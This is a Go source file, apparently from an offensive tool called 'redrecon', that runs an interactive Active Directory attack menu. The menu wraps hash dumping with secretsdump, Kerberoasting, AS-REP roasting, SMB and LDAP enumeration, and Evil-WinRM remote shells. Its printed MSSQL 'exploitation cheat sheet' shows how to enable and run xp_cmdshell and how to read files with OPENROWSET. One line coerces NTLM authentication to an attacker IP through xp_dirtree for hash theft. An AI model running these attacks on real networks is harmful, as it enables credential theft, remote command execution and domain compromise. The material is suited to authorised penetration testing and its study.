package adexplorer

import (
	"bufio"
	"context"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"redrecon/pkg/tools"
	"redrecon/pkg/types"
	"strings"
)

// StartADRecon is the main entry point for the AD Explorer module.
// It wraps StartInteractiveADRecon for backward compatibility.
func StartADRecon(ctx context.Context, taskIdentifier, domain string, targets []string, creds types.Credentials, logger *slog.Logger) error {
	return StartInteractiveADRecon(ctx, taskIdentifier, domain, targets, creds, logger)
}

// StartInteractiveADRecon inicia o modo interativo de exploração de AD.
func StartInteractiveADRecon(ctx context.Context, taskIdentifier, domain string, targets []string, creds types.Credentials, logger *slog.Logger) error {
	reader := bufio.NewReader(os.Stdin)

	// Se não tiver targets, tentar descobrir ou pedir
	if len(targets) == 0 {
		fmt.Print("No targets detected. Enter DC IP or Target IP: ")
		t, _ := reader.ReadString('\n')
		targets = []string{strings.TrimSpace(t)}
	}

	logger.Info("Starting Interactive AD Explorer", "domain", domain, "targets", targets)

	for {
		fmt.Println("\nSelect an action based on your current knowledge:")
		fmt.Println("1. SMB Enumeration (CrackMapExec) - Identify hosts, signing, and shares")
		fmt.Println("2. MSSQL Enumeration (CrackMapExec) - Identify MSSQL instances")
		fmt.Println("3. MSSQL Shell (impacket-mssqlclient) - Interactive SQL Shell (xp_cmdshell, etc.)")
		fmt.Println("4. LDAP Dump (ldapdomaindump) - Extract AD structure (Users, Computers, Groups)")
		fmt.Println("5. Secrets Dump (SecretsDump.py) - Extract hashes (requires Admin/High privs)")
		fmt.Println("6. SMB Enum (Enum4linux-ng) - Detailed SMB enumeration")
		fmt.Println("7. Kerberoasting (GetUserSPNs) - Request TGS tickets of service accounts")
		fmt.Println("8. AS-REP Roasting (GetNPUsers) - Request TGT tickets of users without pre-auth")
		fmt.Println("9. WinRM Shell (Evil-WinRM) - Interactive remote shell (requires valid creds)")
		fmt.Println("10. RDP Cred Check (CrackMapExec) - Verify credentials on RDP")
		fmt.Println("11. Exit")
		fmt.Print("\nEnter choice [1-11]: ")

		text, _ := reader.ReadString('\n')
		choice := strings.TrimSpace(text)

		switch choice {
		case "1":
			logger.Info("Running SMB Enumeration...")
			logFile := filepath.Join("results", taskIdentifier, "adexplorer", "interactive_cme_smb.log")
			if err := tools.RunCrackMapExec(ctx, targets, "smb", creds, logFile, logger); err != nil {
				logger.Error("CME SMB failed", "error", err)
			}
		case "2":
			logger.Info("Running MSSQL Enumeration...")
			logFile := filepath.Join("results", taskIdentifier, "adexplorer", "interactive_cme_mssql.log")
			if err := tools.RunCrackMapExec(ctx, targets, "mssql", creds, logFile, logger); err != nil {
				logger.Error("CME MSSQL failed", "error", err)
			}
		case "3":
			logger.Info("Launching Interactive MSSQL Client...")
			target := ""
			if len(targets) > 0 {
				target = targets[0]
			} else {
				fmt.Print("Enter Target IP/Hostname for MSSQL: ")
				t, _ := reader.ReadString('\n')
				target = strings.TrimSpace(t)
			}

			// Prompt for Auth Type
			fmt.Println("Choose Authentication Type:")
			fmt.Println("1. Windows Authentication (Domain User) [Default]")
			fmt.Println("2. SQL Authentication (Local DB User)")
			fmt.Print("Choice [1/2]: ")
			authChoice, _ := reader.ReadString('\n')
			authChoice = strings.TrimSpace(authChoice)

			useWindowsAuth := true
			if authChoice == "2" {
				useWindowsAuth = false
			}

			// Exibir Cheat Sheet com queries úteis
			printMSSQLCheatSheet()

			fmt.Println("\nPressione ENTER para iniciar o cliente...")
			reader.ReadString('\n')

			if err := tools.RunMSSQLClient(ctx, target, domain, creds, useWindowsAuth, logger); err != nil {
				logger.Error("MSSQL Client failed", "error", err)
			}
		case "4":
			logger.Info("Running LDAP Dump...")
			outputDir := filepath.Join("results", taskIdentifier, "adexplorer", "ldapdump")
			// Assuming first target is DC for now, or ask user?
			// For interactive simplicity, we use the first target if available, or ask.
			target := ""
			if len(targets) > 0 {
				target = targets[0]
			} else {
				fmt.Print("Enter Target IP (DC): ")
				t, _ := reader.ReadString('\n')
				target = strings.TrimSpace(t)
			}

			if err := tools.RunLdapDump(ctx, target, domain, creds, outputDir, logger); err != nil {
				logger.Error("LDAP Dump failed", "error", err)
			} else {
				logger.Info("LDAP Dump complete", "output_dir", outputDir)
			}
		case "5":
			logger.Info("Running Secrets Dump...")
			outputFile := filepath.Join("results", taskIdentifier, "adexplorer", "secretsdump")
			// Requires DC target usually
			// Impacket secretsdump syntax often uses domain/user:pass@target
			// RunSecretsDump needs the target or domain?
			// Check impacket.go implementation.

			// Assuming domain variable is the domain name, but secretsdump needs target IP/hostname to connect to execution.
			// Let's prompt for target if multi-target env.
			// Impacket wrapper likely expects domain arg to be the target for the connection string if calling secretsdump.
			// Let's verify usage of RunSecretsDump. It calls secretsdump.py domain/user...
			// The runImpacketScript logic needs fixing if 'domain' arg is just the domain name and not target.
			// For now, let's assume usage is consistent with current impacket.go fix (which assumes domain arg IS the target IP for connection).
			// This might need revisit, but for now we pass the target IP.
			target := ""
			if len(targets) > 0 {
				target = targets[0]
			} else {
				// Fallback
				target = domain
			}

			if err := tools.RunSecretsDump(ctx, target, creds, outputFile, logger); err != nil {
				logger.Error("Secrets Dump failed", "error", err)
			} else {
				logger.Info("Secrets Dump complete", "output_base", outputFile)
			}
		case "6":
			logger.Info("Running SMB Enum (Enum4linux-ng)...")
			target := ""
			if len(targets) > 0 {
				target = targets[0]
			} else {
				fmt.Print("Enter Target IP: ")
				t, _ := reader.ReadString('\n')
				target = strings.TrimSpace(t)
			}
			outputFile := filepath.Join("results", taskIdentifier, "adexplorer", "enum4linux.txt")
			if err := tools.RunEnum4linuxNG(ctx, target, creds, outputFile, logger); err != nil {
				logger.Error("Enum4linux-ng failed", "error", err)
			} else {
				logger.Info("Enum4linux-ng complete", "output", outputFile)
			}

		case "7":
			logger.Info("Running Kerberoasting...")
			outputFile := filepath.Join("results", taskIdentifier, "adexplorer", "kerberoast.txt")
			if err := tools.RunKerberoasting(ctx, domain, creds, outputFile, logger); err != nil {
				logger.Error("Kerberoasting failed", "error", err)
			} else {
				logger.Info("Kerberoasting check complete", "output", outputFile)
			}
		case "8":
			logger.Info("Running AS-REP Roasting...")
			outputFile := filepath.Join("results", taskIdentifier, "adexplorer", "asreproast.txt")
			if err := tools.RunASRepRoasting(ctx, domain, creds, outputFile, logger); err != nil {
				logger.Error("AS-REP Roasting failed", "error", err)
			} else {
				logger.Info("AS-REP Roasting check complete", "output", outputFile)
			}
		case "9":
			logger.Info("Launching Evil-WinRM...")
			target := ""
			if len(targets) > 0 {
				target = targets[0]
			} else {
				fmt.Print("Enter Target IP for WinRM: ")
				t, _ := reader.ReadString('\n')
				target = strings.TrimSpace(t)
			}
			// WinRM is interactive
			if err := tools.RunEvilWinRM(ctx, target, creds, logger); err != nil {
				logger.Error("Evil-WinRM failed", "error", err)
			}
		case "10":
			logger.Info("Running RDP Cred Check...")
			logFile := filepath.Join("results", taskIdentifier, "adexplorer", "interactive_cme_rdp.log")
			if err := tools.RunCrackMapExec(ctx, targets, "rdp", creds, logFile, logger); err != nil {
				logger.Error("CME RDP failed", "error", err)
			}
		case "11":
			logger.Info("Exiting Interactive AD Explorer.")
			return nil
		default:
			fmt.Println("Invalid choice. Please try again.")
		}
	}
	return nil
}

func printMSSQLCheatSheet() {
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("🚀 MSSQL EXPLOITATION CHEAT SHEET 🚀")
	fmt.Println(strings.Repeat("=", 60))

	fmt.Println("\n[1] BÁSICO E RECONHECIMENTO")
	fmt.Println("    SELECT @@version;                       -- Versão do S.O. e SQL")
	fmt.Println("    SELECT user_name();                     -- Usuário atual (DB)")
	fmt.Println("    SELECT system_user;                     -- Usuário atual (Sistema)")
	fmt.Println("    SELECT is_srvrolemember('sysadmin');    -- É admin? (1 = Sim)")

	fmt.Println("\n[2] EXECUÇÃO DE COMANDOS (XP_CMDSHELL)")
	fmt.Println("    -- Habilitar (se for admin):")
	fmt.Println("    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
	fmt.Println("    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
	fmt.Println("    -- Executar comando:")
	fmt.Println("    EXEC xp_cmdshell 'whoami';")

	fmt.Println("\n[3] ROUBO DE HASHES (SMB)")
	fmt.Println("    -- Forçar autenticação SMB para sua máquina (responder/NTLM relay):")
	fmt.Println("    EXEC master..xp_dirtree '\\\\<SEU_IP>\\share';")

	fmt.Println("\n[4] LEITURA DE ARQUIVOS")
	fmt.Println("    SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\win.ini', SINGLE_CLOB) AS x;")

	fmt.Println("\n[5] LISTAR TODOS OS BANCOS")
	fmt.Println("    SELECT name FROM master..sysdatabases;")

	fmt.Println("\n[6] IMPACKET SPECIAL COMMANDS (Dentro do shell)")
	fmt.Println("    enable_xp_cmdshell                      -- Tenta habilitar tudo automaticamente")
	fmt.Println("    help                                    -- Ver ajuda do impacket")

	fmt.Println(strings.Repeat("=", 60))
}
